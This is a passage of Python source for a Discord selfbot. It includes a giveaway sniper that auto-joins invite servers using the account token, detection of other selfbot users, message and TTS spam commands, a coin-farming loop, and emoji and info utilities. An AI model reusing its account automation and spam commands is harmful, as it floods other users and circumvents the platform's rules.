            "embeds": [
                {
                "title": "React Giveaway Sniper Webhook",
                "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                "thumbnail": {
                    "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                },
                "description": "Won Giveaway",
                "fields": [
                    {
                    "name": "__üõã Server__",
                    "value": f'{msg.guild}',
                    "inline": "true"
                    },
                    {
                    "name": "__ü•§ Channel__",
                    "value": f'{msg.channel}',
                    "inline": "true"
                    },
                    {
                    "name": "__üîó Jump to channel__",
                    "value": f'[Jump URL]({msg.jump_url})',
                    "inline": "true"
                    }
                ],
                "footer": {
                    "text": "React Selfbot"
                }
                }
            ]
            })

            try:
                requests.post(json.load(open('config.json', encoding='utf-8'))['giveaways_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
            except Exception:
                pass
            if json.load(open('config.json', encoding='utf-8'))['giveaway_sound'] == True:
                try:
                    playsound.playsound("./Sound/success.mp3")
                except:
                    pass
        
    async def check_for_giveaway(msg):
        try:
            if json.load(open('config.json', encoding='utf-8'))['giveaway_sniper'] == True and msg.author.bot:
                custom_giveaway_bot_ids = []
                custom_giveaway_bot_reactions = []
                try:
                    if os.path.exists('GiveawayBots.json'):
                        with open("GiveawayBots.json", "r", encoding="utf-8") as jsonFile:
                            data = json.load(jsonFile)
                        
                        for key, value in data.items():
                            try:
                                custom_giveaway_bot_ids.append(int(key))
                                custom_giveaway_bot_reactions.append(str(value))
                            except Exception:
                                pass
                except Exception as e:
                    pass


                if ((("giveaway" in str(msg.content).lower()) and (int(msg.author.id) in custom_giveaway_bot_ids) and ("cancelled" not in str(msg.content).lower()) and ("mention" not in str(msg.content).lower()) and ("specify" not in str(msg.content).lower()) and ("confratulations" not in str(msg.content).lower()))):
                    found_something_blacklisted = 0
                    for blocked_word in giveaway_blocked_words:
                        if str(blocked_word).lower() in str(msg.content).lower():
                            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Skipped Giveaway (Blacklisted)')                        
                            print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}")
                            found_something_blacklisted = 1
                            
                    try:
                        for embed in msg.embeds:
                            embed_dict = embed.to_dict()
                            for blocked_word in giveaway_blocked_words:
                                try:
                                    found = re.findall(blocked_word, str(embed_dict).lower())[0]
                                    if found:
                                        print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Skipped Giveaway (Blacklisted)')                        
                                        print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                                            f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}")
                                        found_something_blacklisted = 1
                                        break
                                except:
                                    pass
                                    
                                if found_something_blacklisted > 0:
                                    break
                    except:
                        pass
                    
                    if found_something_blacklisted == 0:
                        try:
                            embeds = msg.embeds
                            joined_server = 'None'
                            
                            giveaway_prize = None
                            
                            try:
                                for embed in embeds:
                                    giveaway_prize = embed.to_dict()['author']['name']
                            except Exception:
                                for embed in embeds:
                                    giveaway_prize = embed.to_dict()['title']
                            
                            if json.load(open('config.json', encoding='utf-8'))['giveaway_server_joiner']:
                                try:
                                    for embed in embeds:
                                        embed_dict = embed.to_dict()
                                        code = re.findall(r"\w[a-z]*\W*\w[a-z]+\.\w[g]*\W\S*", str(embed_dict['description']))[0].replace(")", "").replace("https://discord.gg/", "")
                                        async with httpx.AsyncClient() as client:
                                            await client.post(f'https://canary.discord.com/api/v8/invites/{code}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                                            joined_server = f'discord.gg/{code}'
                                            asyncio.sleep(5)
                                except:
                                    pass

                            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Giveaway Join')                        
                            print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Prize: {fg.white}{giveaway_prize}"
                                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}"
                                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Joining in: {fg.white}{json.load(open('config.json', encoding='utf-8'))['giveaway_timeout']} seconds"
                                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Joined Discord: {fg.white}{joined_server}")
                            
                            if json.load(open('config.json', encoding='utf-8'))['giveaway_join_notify'] and sys.platform == "win32":
                                try:
                                    toaster.show_toast("Giveaway Sniper", f"You will join a giveaway in {msg.guild} in {json.load(open('config.json', encoding='utf-8'))['giveaway_timeout']} seconds!", icon_path="react.ico", duration=2)
                                except:
                                    pass
                            
                            payload = json.dumps({
                            "embeds": [
                                {
                                "title": "React Giveaway Sniper Webhook",
                                "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                                "thumbnail": {
                                    "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                                },
                                "description": "Entered Giveaway",
                                "fields": [
                                    {
                                    "name": "__üéÅ Prize__",
                                    "value": f'{giveaway_prize}',
                                    "inline": "true"
                                    },
                                    {
                                    "name": "__üõã Server__",
                                    "value": f'{msg.guild}',
                                    "inline": "true"
                                    },
                                    {
                                    "name": "__ü•§ Channel__",
                                    "value": f'{msg.channel}',
                                    "inline": "true"
                                    },
                                    {
                                    "name": "__‚úÖ Joining in__",
                                    "value": f'{json.load(open("config.json", encoding="utf-8"))["giveaway_timeout"]} seconds',
                                    "inline": "true"
                                    },
                                    {
                                    "name": "__üîó Jump to channel__",
                                    "value": f'[Jump URL]({msg.jump_url})',
                                    "inline": "true"
                                    }
                                ],
                                "footer": {
                                    "text": "React Selfbot"
                                }
                                }
                            ]
                            })

                            try:
                                requests.post(json.load(open('config.json', encoding='utf-8'))['giveaways_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                            except Exception:
                                pass
                        except:
                            return

                        await asyncio.sleep(json.load(open('config.json', encoding='utf-8'))['giveaway_timeout'])

                        try:
                            if int(msg.author.id) in custom_giveaway_bot_ids:
                                index = custom_giveaway_bot_ids.index(int(msg.author.id))
                                await msg.add_reaction(custom_giveaway_bot_reactions[index])
                        except Exception:
                            pass
        except Exception as e:
            pass

        if msg.author.bot == False and msg.embeds and msg.author.id is not React.user.id and selfbot_user_detection and not 'http' in msg.content:
            try:
                with open("DetectedSelfbotUsers.json", "r") as jsonFile:
                    data = json.load(jsonFile)

                
                if not str(msg.author.id) in data:
                    data[msg.author.id] = [f'{msg.author}', 'Embeds']
                    print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + 'Type: Selfbot User')                    
                    print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Server: {fg.white}{msg.guild}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | User: {fg.white}{msg.author}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Channel: {fg.white}{msg.channel}")
                    
                    if json.load(open('config.json', encoding='utf-8'))['selfbot_sound'] == True:
                        try:
                            playsound.playsound("./Sound/selfbot.mp3")
                        except:
                            pass

                    payload = json.dumps({
                            "embeds": [
                                {
                                "title": "React Detection Webhook",
                                "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                                "thumbnail": {
                                    "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                                },
                                "description": "Detected Selfbot User",
                                "fields": [
                                    {
                                    "name": "__üß¨ Author__",
                                    "value": f'{msg.author}',
                                    "inline": "true"
                                    },
                                    {
                                    "name": "__üõã Server__",
                                    "value": f'{msg.guild}',
                                    "inline": "true"
                                    },
                                    {
                                    "name": "__ü•§ Channel__",
                                    "value": f'{msg.channel}',
                                    "inline": "true"
                                    },
                                    {
                                    "name": "__üîó Jump to channel__",
                                    "value": f'[Jump URL]({msg.jump_url})',
                                    "inline": "true"
                                    }
                                ],
                                "footer": {
                                    "text": "React Selfbot"
                                }
                                }
                            ]
                            })

                    try:
                        requests.post(json.load(open('config.json', encoding='utf-8'))['selfbot_detection_webhook'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                    except Exception:
                        pass

                    try:
                        if json.load(open('config.json', encoding='utf-8'))['selfbot_detection_notify'] and sys.platform == "win32":
                            try:
                                toaster.show_toast("Selfbot Detection", f"User: {msg.author} \nServer: {msg.guild} \nChannel: {msg.channel}", icon_path="react.ico", duration=2)
                            except:
                                pass
                    except:
                        pass
                
                with open("DetectedSelfbotUsers.json", "w") as jsonFile:
                    json.dump(data, jsonFile, indent=4, sort_keys=False)

            except Exception:
                pass
                


    @React.command(usage="spam <Amount> <Timeout in Seconds> <Message>", description="Spams a specific message specific amount of times")
    async def spam(ctx, amount:int, timeout: float, *, message: str):
        try:
            for i in range(0, amount):
                await ctx.send(f'{message}')
                await asyncio.sleep(timeout)
        except Exception:
            pass

    async def farm(ctx):
        await ctx.send('pls beg')
        await asyncio.sleep(2)
        await ctx.send('pls deposit all')
        
    @React.command(usage="dankfarm", description="Starts farming coins for Dank Memer")
    async def dankfarm(ctx):
        try:
            while True:
                await farm(ctx)
                await asyncio.sleep(60)
        except Exception:
            return
    
    @React.command(usage="spamtts <Amount> <Timeout in Seconds> <Message>", description="Spams a specific tts message specific amount of times")
    async def spamtts(ctx, amount:int, timeout: int, *, message: str):
        try:
            for i in range(0, amount):
                await ctx.send(f'{message}', tts=True)
                await asyncio.sleep(timeout)
        except Exception:
            pass

    @React.command(usage="avatar [User]", description="Shows user's avatar")
    async def avatar(ctx, memberid: discord.User=None):
        
        try:
            if memberid is None:
                member = ctx.author
            else:
                member = memberid
            av = member.avatar_url
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'],timestamp=embed_timestamp())
                embed.set_image(url=av)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(av)
        except Exception:
            return

    @React.command(usage="serverlogo [Server ID]", description="Shows server's logo")
    async def serverlogo(ctx, serverid: int=None):
        
        if serverid is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=serverid)
        icon = server.icon_url

        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'],timestamp=embed_timestamp())

            embed.set_image(url=icon)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            await ctx.send(icon)

    @React.command(usage="grouplogo", description="Shows groupchats's logo")
    async def grouplogo(ctx):
        icon = ctx.channel.icon_url

        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'],timestamp=embed_timestamp())
            embed.set_image(url=icon)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            await ctx.send(icon)

    @React.command(usage="roleinfo <Role>", description="Shows role information")
    async def roleinfo(ctx, *, role: discord.Role):
        
        since_created = (ctx.message.created_at - role.created_at).days
        role_created = role.created_at.strftime("%d %b %Y %H:%M")
        created_on = "{} ({} days ago)".format(role_created, since_created)
        members = ''
        i = 0
        for user in role.members:
            members += f'{user.name}, '
            i+=1
            if i > 30:
                break

        if str(role.colour) == "#000000":
            colour = "default"
            color = ("#%06x" % random.randint(0, 0xFFFFFF))
            color = int(colour[1:], 16)
        else:
            colour = str(role.colour).upper()
            color = role.colour

        em = discord.Embed(colour=color,timestamp=embed_timestamp())
        em.add_field(name="Role", value=role.name)
        em.add_field(name="Users", value=len(role.members))
        em.add_field(name="Mentionable", value=role.mentionable)
        em.add_field(name="Hoist", value=role.hoist)
        em.add_field(name="Position", value=role.position)
        em.add_field(name="Managed", value=role.managed)
        em.add_field(name="Color", value=colour)
        em.add_field(name='Creation Date', value=created_on)
        em.add_field(name='Members', value=members[:-2], inline=False)
        em.add_field(name='Role ID', value=role.id, inline=False)
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)
            
    @React.command(usage="emojiinfo <Emoji>", description="Emoji information")
    async def emojiinfo(ctx, emoji: discord.Emoji):
        

        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title = 'Emoji Info', timestamp=embed_timestamp())
        em.add_field(name="Name", value=emoji.name)
        em.add_field(name="Animated", value=bool(emoji.animated))
        em.add_field(name="Available", value=bool(emoji.available))
        em.add_field(name="Created At", value=emoji.created_at)
        em.add_field(name="Managed", value=emoji.managed)
        em.add_field(name="ID", value=emoji.id)
        em.add_field(name="URL", value=emoji.url)
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)

            
#         @React.command()
#         async def channelinfo(ctx, server_id, channel_id):
#             try:
#                 server = discord.utils.get(React.guilds, id=server_id)
#                 print(server)
#                 channel = discord.utils.get(server.channels, id=channel_id)
            
#                 print(channel)

#     #             if True:
#     #                 em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title = 'Emoji Info', timestamp=embed_timestamp())
#     #                 em.add_field(name="Name", value=emoji.name)
#     #                 em.add_field(name="Animated", value=bool(emoji.animated))
#     #                 em.add_field(name="Available", value=bool(emoji.available))
#     #                 em.add_field(name="Created At", value=emoji.created_at)
#     #                 em.add_field(name="Managed", value=emoji.managed)
#     #                 em.add_field(name="ID", value=emoji.id)
#     #                 em.add_field(name="URL", value=emoji.url)
#     #                 em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
#     #                 em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
#     #                 em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
#     #                 await embed_or_codeblock(ctx, em)


#     #             else:
#     #                 msg = f'''```yaml
# # Role Information:
# # Name: {emoji.name}
# # Animated: {bool(emoji.animated)}
# # Available: {bool(emoji.available)}
# # Created At: {emoji.created_at}
# # Managed: {emoji.managed}
# # ID: {emoji.id}
# # URL: {emoji.url}
# # ```'''
#     #                 await ctx.send(msg)
#             except Exception:
#                 pass
            
    @React.command(usage="snowflakeinfo <Snowflake ID>", description="Discord Snowflake information")
    async def snowflakeinfo(ctx, snowflake: int):
        snowflake = discord.Object(snowflake)
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title = 'Snowflake Info', timestamp=embed_timestamp())
        em.add_field(name="ID", value=snowflake.id)
        em.add_field(name="Created At", value=f"{snowflake.created_at} UTC")
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="pin <Channel> <Message ID>", description="Pin a message")
    async def pin(ctx, channel: discord.TextChannel, message_id: int):
        try:
            async for message in channel.history(limit=None):
                if (not message_id and message_id != ctx.message.id) or (message_id == message.id):
                    try:
                        await message.pin()
                    except:
                        pass
        except Exception:
            pass
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title = 'Pin', timestamp=embed_timestamp())
        em.add_field(name="Channel", value=channel.mention)
        em.add_field(name="Message ID", value=f"{message_id}")
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="unpin <Channel> <Message ID>", description="Unpin a message")
    async def unpin(ctx, channel: discord.TextChannel, message_id: int):
        try:
            async for message in channel.history(limit=None):
                if (not message_id and message_id != ctx.message.id) or (message_id == message.id):
                    try:
                        await message.unpin()
                    except:
                        pass
        except Exception:
            pass
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title = 'Unpin', timestamp=embed_timestamp())
        em.add_field(name="Channel", value=channel.mention)
        em.add_field(name="Message ID", value=f"{message_id}")
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="emoji <Emoji>", description="Send emoji in bigger format")
    async def emoji(ctx, emoji: discord.Emoji):
        await ctx.send(emoji.url)

    @React.command(usage="addemoji <Name> <URL>", description="Adds an emoji")
    async def addemoji(ctx, name, url):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Add Emoji', description=f'Added Emoji **{name}**',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        await ctx.guild.create_custom_emoji(name=name, image=bytes(requests.get(url).content))
        
    @React.command(usage="editemoji <Emoji> <Name>", description="Renames the emoji")
    async def editemoji(ctx, emoji: discord.Emoji, name):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Edit Emoji', description=f'Renamed {emoji.name} to {name}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        await emoji.edit(name = name)
        
    @React.command(usage="emojidelete <Emoji>", description="Deletes the emoji")
    async def emojidelete(ctx, emoji: discord.Emoji):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Emoji Delete', description=f'Deleted emoji {emoji}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        await emoji.delete()

        
    @React.command(usage="guilds", description="Shows a list of your guilds")
    async def guilds(ctx):
        guilds = []
        for guild in React.guilds:
            guilds.append(guild)
            
        try:
            if True:
